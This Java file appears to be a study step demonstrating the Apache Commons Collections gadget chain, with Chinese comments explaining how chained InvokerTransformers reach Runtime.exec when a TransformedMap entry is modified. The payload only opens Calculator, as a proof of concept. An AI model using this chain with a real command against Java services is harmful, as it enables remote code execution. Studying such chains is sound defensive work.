import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class Main1 {

    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {



        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),

                // InvokerTransformer对象的transform方法可以反射任意对象及调用其方法
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]{"open /Applications/Calculator.app"})
        };


        // ChainedTransformer能够将多个Transformer串联起来
        Transformer transformedChain = new ChainedTransformer(transformers);




        /**
         * Apache Commons Collections中实现了类TransformedMap，用来对Map进行某种变换，只要调用decorate()函数，
         * 传入key和value的变换函数Transformer，即可从任意Map对象生成相应的TransformedMap.
         *
         * 当Map中的任意项的Key或者Value被修改，相应的Transformer就会被调用。除此以外，多个Transformer还能串起来，形成ChainedTransformer。
         */

        Map<String, String> innerMap = new HashMap<String, String>();
        innerMap.put("value", "value");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);

        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();

        // 对map进行修改时，会调用InvokerTransformer的transform方法
        onlyElement.setValue("foobar");




        // 接下来找个能出发SetValue的类，进行出发即可，具体看 Main2


    }

}
